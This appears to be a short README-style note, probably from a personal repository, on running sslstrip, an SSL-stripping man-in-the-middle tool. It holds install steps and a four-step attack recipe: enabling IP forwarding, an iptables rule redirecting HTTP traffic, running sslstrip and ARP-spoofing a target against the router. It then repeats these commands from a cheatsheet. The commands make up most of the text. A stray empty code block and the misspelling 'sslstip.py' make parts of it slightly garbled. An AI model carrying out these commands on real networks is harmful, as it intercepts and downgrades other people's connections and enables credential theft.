# SSL-Stipping-Attack

[GitHub Moxie0 - sslstrip](https://github.com/moxie0/sslstrip)

`sslstrip` is a MITM tool that implements Moxie Marlinspike's SSL stripping 
attacks. Link 
>
 It requires Python 2.5 or newer, along with the 'twisted' python module.
>
 Installing:
	* Unpack: tar zxvf sslstrip-0.5.tar.gz
	* Install twisted:  sudo apt-get install python-twisted-web
	* (Optionally) run 'python setup.py install' as root to install, 
	  or you can just run it out of the directory.  
>
 Running:
	sslstrip can be run from the source base without installation.  
	Just run 'python sslstrip.py -h' as a non-root user to get the 
	command-line options.
>
	The four steps to getting this working (assuming you're running Linux) 
	are:
>
	1) Flip your machine into forwarding mode (as root):
	   echo "1" > /proc/sys/net/ipv4/ip_forward
>
	2) Setup iptables to intercept HTTP requests (as root):
	   `iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port <yourListenPort>`
>
	3) Run sslstrip with the command-line options you'd like (see above).
>
	4) Run arpspoof to redirect traffic to your machine (as root):
	   `arpspoof -i <yourNetworkdDevice> -t <yourTarget> <theRoutersIpAddress>`

Neither are functional:

```

Usage from [GitHub OlivierLaflamme/Cheatsheet-God Cheatsheet_SSLStrip.txt](https://github.com/OlivierLaflamme/Cheatsheet-God/blob/master/Cheatsheet_SSLStrip.txt) :
```bash
# Flip your machine into forwarding mode (as root):
echo "1" > /proc/sys/net/ipv4/ip_forward

# Setup iptables to intercept HTTP requests (as root):
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
	
sslstip.py -l 8080 -f lock.ico

# Run arpspoof to redirect traffic to your machine (as root):
arpspoof -i <yourNetworkdDevice> -t <yourTarget> <theRoutersIpAddress>
```
